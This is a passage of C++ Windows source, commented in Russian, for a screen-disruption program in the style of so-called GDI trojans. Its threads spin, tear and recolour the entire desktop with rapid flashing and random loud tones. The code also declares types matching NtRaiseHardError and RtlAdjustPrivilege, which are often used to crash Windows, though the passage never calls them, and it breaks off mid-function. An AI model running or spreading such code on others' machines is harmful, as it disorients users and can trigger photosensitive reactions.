// raznos.cpp - ФИНАЛЬНАЯ ВЕРСИЯ
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include <Windows.h>
#include <tchar.h>
#include <windowsx.h>
#include <math.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "advapi32.lib")

#define M_PI 3.14159265358979323846264338327950288

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// ==================== ГЛОБАЛЬНЫЕ ====================
volatile bool stopEffects = false;
volatile bool soundRunning = true;

// ==================== ЗВУК ====================
void PlaySoundEffect(int freq, int duration, int type) {
    if (!soundRunning || freq < 20 || freq > 20000) return;
    if (duration < 10) duration = 10;
    int samples = duration * 44100 / 1000;
    short* buffer = new short[samples];
    for (int i = 0; i < samples; i++) {
        double t = (double)i / 44100.0;
        double wave = 0;
        switch (type) {
            case 0: wave = sin(2.0 * M_PI * freq * t) + 0.5 * sin(2.0 * M_PI * freq * 1.5 * t); break;
            case 1: wave = sin(2.0 * M_PI * freq * t) + 0.7 * sin(2.0 * M_PI * freq * 0.7 * t + 0.5); break;
            case 2: wave = (rand() % 20000 - 10000) / 10000.0; break;
            case 3: wave = sin(2.0 * M_PI * freq * t) * (1 + 0.3 * sin(2.0 * M_PI * 50 * t)); break;
            case 4: wave = sin(2.0 * M_PI * freq * t) + 0.3 * sin(2.0 * M_PI * freq * 2.3 * t) + 0.1 * sin(2.0 * M_PI * freq * 3.7 * t); break;
            case 5: wave = sin(2.0 * M_PI * freq * t) * (1 + 0.5 * sin(2.0 * M_PI * 2 * t)); break;
            case 6: wave = sin(2.0 * M_PI * (freq + 200 * sin(2.0 * M_PI * 5 * t)) * t); break;
            case 7: wave = sin(2.0 * M_PI * freq * t) * (int)(sin(2.0 * M_PI * (freq / 2) * t) * 100) / 100.0; break;
            case 8: wave = (rand() % 10000 - 5000) / 5000.0 * sin(2.0 * M_PI * freq * t); break;
            case 9: wave = sin(2.0 * M_PI * freq * t) * exp(-t * 0.01); break;
            default: wave = sin(2.0 * M_PI * freq * t); break;
        }
        buffer[i] = (short)(wave * 16000);
    }
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wf = { WAVE_FORMAT_PCM, 1, 44100, 88200, 2, 16, 0 };
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        delete[] buffer; return;
    }
    WAVEHDR wh = { 0 };
    wh.lpData = (LPSTR)buffer;
    wh.dwBufferLength = samples * 2;
    wh.dwFlags = 0;
    waveOutPrepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wh, sizeof(WAVEHDR));
    Sleep(duration + 20);
    waveOutUnprepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

void SoundThread(int freq, int duration, int type) {
    if (soundRunning) PlaySoundEffect(freq, duration, type);
}

// ==================== ЭФФЕКТ 1: ПОЛНЫЙ ПЕРЕВОРОТ ====================
DWORD WINAPI fullSpin(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    double angle = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        angle += 0.05;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int cx = w / 2, cy = h / 2;
                int dx = x - cx, dy = y - cy;
                double a = atan2((double)dy, (double)dx) + angle;
                double dist = sqrt((double)(dx * dx + dy * dy));
                int nx = cx + (int)(dist * cos(a));
                int ny = cy + (int)(dist * sin(a));
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    COLORREF c = GetPixel(mdc, nx, ny);
                    SetPixel(hdc, x, y, c);
                }
            }
        }
        for (int i = 0; i < 50; i++) {
            int x = rand() % w, y = rand() % h, r = 20 + rand() % 100;
            for (int a = 0; a < 360; a += 10) {
                int px = x + (int)(r * cos(a * M_PI / 180 + angle));
                int py = y + (int)(r * sin(a * M_PI / 180 + angle));
                if (px >= 0 && px < w && py >= 0 && py < h)
                    SetPixel(hdc, px, py, RGB(rand()%256, rand()%256, rand()%256));
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(200 + rand() % 3000, 50 + rand() % 100, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 2: RGB АД ====================
DWORD WINAPI rgbHell(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int phase = 0;
    while (!stopEffects) {
        HDC hdc = GetDC(0);
        phase += 2;
        for (int y = 0; y < h; y += 2) {
            int r_shift = (int)(50 * sin(y * 0.03 + phase * 0.05));
            int g_shift = (int)(50 * cos(y * 0.04 + phase * 0.07));
            int b_shift = (int)(50 * sin(y * 0.05 + phase * 0.03 + 1));
            for (int x = 0; x < w; x += 2) {
                int r = (x + r_shift + phase) % 255;
                int g = (y + g_shift + phase * 2) % 255;
                int b = (x + y + b_shift + phase * 3) % 255;
                SetPixel(hdc, x, y, RGB(r, g, b));
                SetPixel(hdc, x + 1, y + 1, RGB(b, r, g));
            }
        }
        for (int i = 0; i < 20; i++) {
            int cx = rand() % w, cy = rand() % h, radius = 10 + rand() % 50;
            for (int a = 0; a < 360; a += 5) {
                for (int r = 0; r < radius; r += 3) {
                    int px = cx + (int)(r * cos(a * M_PI / 180 + phase * 0.01));
                    int py = cy + (int)(r * sin(a * M_PI / 180 + phase * 0.01));
                    if (px >= 0 && px < w && py >= 0 && py < h) {
                        int col = (r + a + phase) % 360;
                        SetPixel(hdc, px, py, RGB(
                            (int)(128 + 127 * sin(col * M_PI / 180)),
                            (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                            (int)(128 + 127 * sin((col + 240) * M_PI / 180))
                        ));
                    }
                }
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(100 + rand() % 4000, 30 + rand() % 100, rand() % 10);
        Sleep(15 + rand() % 20);
    }
    return 0;
}

// ==================== ЭФФЕКТ 3: МУТАЦИЯ ПИКСЕЛЕЙ ====================
DWORD WINAPI pixelMutation(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, size * 4, pixels);
        phase++;
        int mutationType = rand() % 3;
        for (int i = 0; i < size; i += 2) {
            int x = i % w, y = i / w;
            int idx = y * w + x;
            if (mutationType == 0) {
                COLORREF c = pixels[idx];
                pixels[idx] = RGB(GetBValue(c), GetRValue(c), GetGValue(c));
            } else if (mutationType == 1) {
                int nidx = ((y + phase) % h) * w + ((x + phase) % w);
                pixels[idx] = pixels[nidx] ^ (phase * 0x010101);
            } else {
                COLORREF c1 = pixels[idx], c2 = pixels[(idx + phase) % size];
                pixels[idx] = RGB((GetRValue(c1)+GetRValue(c2))/2, (GetGValue(c1)+GetGValue(c2))/2, (GetBValue(c1)+GetBValue(c2))/2);
            }
        }
        SetBitmapBits(bmp, size * 4, pixels);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(500 + rand() % 3000, 20 + rand() % 80, rand() % 10);
        Sleep(10 + rand() % 20);
    }
    delete[] pixels;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 4: РАЗРЫВ НА 1000 ЧАСТЕЙ ====================
DWORD WINAPI thousandPieces(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int pieces = 50 + rand() % 200;
        for (int i = 0; i < pieces; i++) {
            int x = rand() % w, y = rand() % h, w2 = 10 + rand() % 60, h2 = 10 + rand() % 60;
            int dx = rand() % 100 - 50, dy = rand() % 100 - 50;
            BitBlt(hdc, x + dx, y + dy, w2, h2, mdc, x, y, SRCCOPY);
            if (rand() % 3 == 0) BitBlt(hdc, x + dx/2, y + dy/2, w2/2, h2/2, mdc, x, y, NOTSRCCOPY);
        }
        ReleaseDC(0, hdc);
        SoundThread(300 + rand() % 2000, 40 + rand() % 100, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 5: ВОЛНЫ ХАОСА ====================
DWORD WINAPI chaosWaves(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        for (int wave = 0; wave < 8; wave++) {
            int freq = 10 + wave * 5, amp = 20 + wave * 10;
            int shift = (int)(50 * sin(phase * 0.01 + wave * 0.5));
            for (int y = 0; y < h; y += 2) {
                int offset = (int)(amp * sin(y * 0.02 * freq + phase * 0.03 + wave * 1.2));
                BitBlt(hdc, offset + shift, y, w, 2, mdc, -offset / 3, y, SRCCOPY);
                if (wave % 2 == 0) BitBlt(hdc, -offset / 2 + shift, y + 1, w / 2, 1, mdc, w / 2, y + 1, NOTSRCCOPY);
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(100 + rand() % 3000, 30 + rand() % 80, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 6: ЗЕРКАЛЬНЫЙ АД ====================
DWORD WINAPI mirrorHell(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        int mirrors = 3 + rand() % 5;
        for (int i = 0; i < mirrors; i++) {
            int mx = w/2 + (int)(100 * sin(phase * 0.01 + i * 2.0));
            int my = h/2 + (int)(100 * cos(phase * 0.013 + i * 1.7));
            int mw = 20 + rand() % 200, mh = 20 + rand() % 200;
            BitBlt(hdc, mx - mw, my - mh, mw, mh, mdc, mx, my, SRCCOPY);
            BitBlt(hdc, mx, my - mh, mw, mh, mdc, mx - mw, my, SRCCOPY);
            BitBlt(hdc, mx - mw, my, mw, mh, mdc, mx, my - mh, SRCCOPY);
            BitBlt(hdc, mx, my, mw, mh, mdc, mx - mw, my - mh, SRCCOPY);
            BitBlt(hdc, mx + rand() % 50 - 25, my + rand() % 50 - 25, mw/2, mh/2, mdc, 0, 0, NOTSRCCOPY);
        }
        ReleaseDC(0, hdc);
        SoundThread(400 + rand() % 2000, 30 + rand() % 100, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 7: ВЗРЫВНАЯ КАША ====================
DWORD WINAPI explosionMash(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, size * 4, pixels);
        for (int e = 0; e < 10; e++) {
            int cx = rand() % w, cy = rand() % h, radius = 50 + rand() % 150;
            for (int i = 0; i < size; i += 3) {
                int x = i % w, y = i / w, dx = x - cx, dy = y - cy;
                int dist = (int)sqrt((double)(dx * dx + dy * dy));
                if (dist < radius) {
                    int offset = (int)((radius - dist) * 0.8);
                    int nx = x + (dx * offset / (dist + 1));
                    int ny = y + (dy * offset / (dist + 1));
                    if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                        int idx = y * w + x, nidx = ny * w + nx;
                        COLORREF c = pixels[idx];
                        int noise = rand() % 200 - 100;
                        pixels[nidx] = RGB((GetRValue(c) + noise + phase) % 255,
                                          (GetGValue(c) + noise + phase * 2) % 255,
                                          (GetBValue(c) + noise + phase * 3) % 255);
                    }
                }
            }
            phase += 2;
        }
        SetBitmapBits(bmp, size * 4, pixels);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(50 + rand() % 3000, 20 + rand() % 60, rand() % 10);
        Sleep(10 + rand() % 20);
    }
    delete[] pixels;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 8: КАЛЕЙДОСКОПИЧЕСКИЙ ХАОС ====================
DWORD WINAPI kaleidoscopeChaos(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        int segments = 6 + rand() % 10;
        int cx = w/2 + (int)(100 * sin(phase * 0.01));
        int cy = h/2 + (int)(100 * cos(phase * 0.013));
        for (int i = 0; i < segments; i++) {
            double a1 = 2 * M_PI * i / segments + phase * 0.008;
            double a2 = 2 * M_PI * (i + 1) / segments + phase * 0.008;
            int x1 = cx + (int)(w * cos(a1)), y1 = cy + (int)(h * sin(a1));
            int x2 = cx + (int)(w * cos(a2)), y2 = cy + (int)(h * sin(a2));
            int mx = (x1 + x2) / 2, my = (y1 + y2) / 2;
            int mw = abs(x2 - x1), mh = abs(y2 - y1);
            BitBlt(hdc, mx, my, mw, mh, mdc, cx, cy, SRCCOPY);
            BitBlt(hdc, mx - mw/2, my - mh/2, mw/2, mh/2, mdc, 0, 0, NOTSRCCOPY);
        }
        ReleaseDC(0, hdc);
        SoundThread(300 + rand() % 2000, 30 + rand() % 80, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 9: СМЕЩЕНИЕ И РАСТЯЖЕНИЕ ====================
DWORD WINAPI stretchShift(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        StretchBlt(hdc, -20, -20, w + 40, h + 40, mdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 20, 20, w - 40, h - 40, mdc, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            int x = rand() % w, y = rand() % h, bw = 20 + rand() % 100, bh = 20 + rand() % 100;
            int dx = rand() % 120 - 60, dy = rand() % 120 - 60;
            BitBlt(hdc, x + dx, y + dy, bw, bh, mdc, x, y, SRCCOPY);
            if (rand() % 3 == 0) BitBlt(hdc, x - dx/2, y - dy/2, bw/2, bh/2, mdc, x, y, SRCINVERT);
        }
        ReleaseDC(0, hdc);
        SoundThread(200 + rand() % 3000, 20 + rand() % 80, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 10: ХАОТИЧЕСКИЙ ШУМ ====================
DWORD WINAPI movingChaosNoise(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int phase = 0;
    while (!stopEffects) {
        HDC hdc = GetDC(0);
        phase++;
        for (int y = 0; y < h; y += 2) {
            int shift = (int)(50 * sin(y * 0.02 + phase * 0.05));
            for (int x = 0; x < w; x += 2) {
                int val = (rand() % 256) ^ (phase + x + y + shift);
                SetPixel(hdc, x, y, RGB((val + phase) % 255, (val + phase * 2 + 50) % 255, (val + phase * 3 + 100) % 255));
                SetPixel(hdc, x + 1, y, RGB((val + phase * 2 + 50) % 255, (val + phase * 3 + 100) % 255, (val + phase) % 255));
                SetPixel(hdc, x, y + 1, RGB((val + phase * 3 + 100) % 255, (val + phase) % 255, (val + phase * 2 + 50) % 255));
            }
        }
        for (int i = 0; i < 50; i++) {
            int x = rand() % w, y = rand() % h, len = 50 + rand() % 200, angle = rand() % 360;
            for (int j = 0; j < len; j++) {
                int px = x + (int)(j * cos(angle * M_PI / 180 + phase * 0.005));
                int py = y + (int)(j * sin(angle * M_PI / 180 + phase * 0.005));
                if (px >= 0 && px < w && py >= 0 && py < h) {
                    int col = (px + py + phase) % 360;
                    SetPixel(hdc, px, py, RGB((int)(128 + 127 * sin(col * M_PI / 180)),
                                             (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                                             (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
                }
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(50 + rand() % 3000, 20 + rand() % 60, rand() % 10);
        Sleep(10 + rand() % 20);
    }
    return 0;
}

// ==================== ЭФФЕКТ 11: РАЗРЫВ ЦВЕТА ====================
DWORD WINAPI colorChannelBreak(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    RGBQUAD* data = new RGBQUAD[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmpi = {0};
    bmpi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, 0, (void**)&data, 0, 0);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        int rOff = (int)(40 * sin(phase * 0.01)), gOff = (int)(40 * cos(phase * 0.015)), bOff = (int)(40 * sin(phase * 0.02 + 1));
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int idx = y * w + x;
                int rIdx = ((y + rOff + (int)(20 * sin(y * 0.01))) % h) * w + ((x + rOff + (int)(20 * cos(x * 0.01))) % w);
                int gIdx = ((y + gOff + (int)(20 * cos(y * 0.015))) % h) * w + ((x + gOff + (int)(20 * sin(x * 0.015))) % w);
                int bIdx = ((y + bOff + (int)(20 * sin(y * 0.02))) % h) * w + ((x + bOff + (int)(20 * cos(x * 0.02))) % w);
                data[idx].rgbRed = data[rIdx].rgbRed ^ (phase % 50);
                data[idx].rgbGreen = data[gIdx].rgbGreen ^ ((phase * 2) % 50);
                data[idx].rgbBlue = data[bIdx].rgbBlue ^ ((phase * 3) % 50);
            }
        }
        SetBitmapBits(bmp, size * 4, data);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(400 + rand() % 3000, 20 + rand() % 60, rand() % 10);
        Sleep(15 + rand() % 20);
    }
    delete[] data;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 12: РАДИАЛЬНЫЙ ВЗРЫВ ====================
DWORD WINAPI radialExplosion(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, size * 4, pixels);
        phase++;
        int cx = w/2 + (int)(50 * sin(phase * 0.01)), cy = h/2 + (int)(50 * cos(phase * 0.013));
        int radius = 50 + (int)(100 * sin(phase * 0.005));
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx, dy = y - cy, dist = (int)sqrt((double)(dx * dx + dy * dy));
                if (dist < radius) {
                    int offset = (int)((radius - dist) * 0.8);
                    int nx = x + (dx * offset / (dist + 1));
                    int ny = y + (dy * offset / (dist + 1));
                    if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                        int idx = y * w + x, nidx = ny * w + nx;
                        COLORREF c = pixels[idx];
                        int col = (dist + phase) % 360;
                        pixels[nidx] = RGB((GetRValue(c) + (int)(127 * sin(col * M_PI / 180))) % 255,
                                          (GetGValue(c) + (int)(127 * sin((col + 120) * M_PI / 180))) % 255,
                                          (GetBValue(c) + (int)(127 * sin((col + 240) * M_PI / 180))) % 255);
                    }
                }
            }
        }
        SetBitmapBits(bmp, size * 4, pixels);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(100 + rand() % 3000, 30 + rand() % 80, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    delete[] pixels;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 13: ГРАДИЕНТНЫЙ ХАОС ====================
DWORD WINAPI gradientChaos(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        for (int y = 0; y < h; y += 2) {
            int offset = (int)(60 * sin(y * 0.02 + phase * 0.03)) + (int)(30 * sin(y * 0.05 + phase * 0.05));
            int col = (phase + y * 3) % 360;
            HBRUSH brush = CreateSolidBrush(RGB((int)(128 + 127 * sin(col * M_PI / 180)),
                                                (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                                                (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
            SelectObject(hdc, brush);
            RECT rect = { offset, y, w + offset, y + 2 };
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);
            BitBlt(hdc, offset / 2, y, w / 2, 2, mdc, 0, y, NOTSRCCOPY);
            BitBlt(hdc, -offset / 3, y + 1, w / 3, 1, mdc, w / 3, y + 1, SRCINVERT);
        }
        ReleaseDC(0, hdc);
        SoundThread(200 + rand() % 2000, 30 + rand() % 80, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 14: ЗВЕЗДНЫЙ ХАОС ====================
DWORD WINAPI starChaos(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int phase = 0;
    while (!stopEffects) {
        HDC hdc = GetDC(0);
        phase++;
        for (int i = 0; i < 100; i++) {
            int cx = rand() % w, cy = rand() % h, radius = 5 + rand() % 30;
            int col = (rand() % 360 + phase) % 360;
            HPEN pen = CreatePen(PS_SOLID, 1, RGB((int)(128 + 127 * sin(col * M_PI / 180)),
                                                  (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                                                  (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
            SelectObject(hdc, pen);
            HBRUSH brush = CreateSolidBrush(RGB((int)(128 + 127 * sin((col + 60) * M_PI / 180)),
                                                (int)(128 + 127 * sin((col + 180) * M_PI / 180)),
                                                (int)(128 + 127 * sin((col + 300) * M_PI / 180))));
            SelectObject(hdc, brush);
            POINT pts[10];
            for (int j = 0; j < 10; j++) {
                double angle = j * M_PI / 5 - M_PI / 2 + phase * 0.001;
                int r = (j % 2 == 0) ? radius : radius / 2;
                pts[j].x = cx + (int)(r * cos(angle));
                pts[j].y = cy + (int)(r * sin(angle));
            }
            Polygon(hdc, pts, 10);
            DeleteObject(pen);
            DeleteObject(brush);
        }
        ReleaseDC(0, hdc);
        SoundThread(500 + rand() % 2000, 20 + rand() % 60, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    return 0;
}

// ==================== ЭФФЕКТ 15: ТАНЦУЮЩИЕ БЛОКИ ====================
DWORD WINAPI dancingBlocks(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        int blockSize = 10 + rand() % 30;
        for (int x = 0; x < w; x += blockSize) {
            for (int y = 0; y < h; y += blockSize) {
                int dx = (int)(20 * sin(x * 0.01 + y * 0.02 + phase * 0.03));
                int dy = (int)(20 * cos(x * 0.015 + y * 0.01 + phase * 0.035));
                int col = (x + y + phase) % 360;
                HBRUSH brush = CreateSolidBrush(RGB((int)(128 + 127 * sin(col * M_PI / 180)),
                                                    (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                                                    (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
                SelectObject(hdc, brush);
                Rectangle(hdc, x + dx, y + dy, x + dx + blockSize, y + dy + blockSize);
                DeleteObject(brush);
            }
        }
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(300 + rand() % 2000, 20 + rand() % 60, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 16: МАЯТНИК (новый) ====================
DWORD WINAPI pendulumSwing(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        double angle = sin(phase * 0.03) * 30;
        // Поворот и смещение
        for (int y = 0; y < h; y += 2) {
            int offsetX = (int)(angle * cos(y * 0.02 + phase * 0.01));
            int offsetY = (int)(angle * sin(y * 0.02 + phase * 0.01));
            BitBlt(hdc, offsetX, y + offsetY/2, w, 2, mdc, 0, y, SRCCOPY);
            // Размытие при качании
            if (abs(offsetX) > 10) {
                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 30, 0};
                AlphaBlend(hdc, offsetX/2, y, w, 2, mdc, 0, y, w, 2, bf);
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(100 + rand() % 2000, 30 + rand() % 80, rand() % 10);
        Sleep(20 + rand() % 30);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ: ЭСКАЛАТОР (ЗИГ-ЗАГ В ПРАВЫЙ НИЖНИЙ УГОЛ) ====================
DWORD WINAPI escalator(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
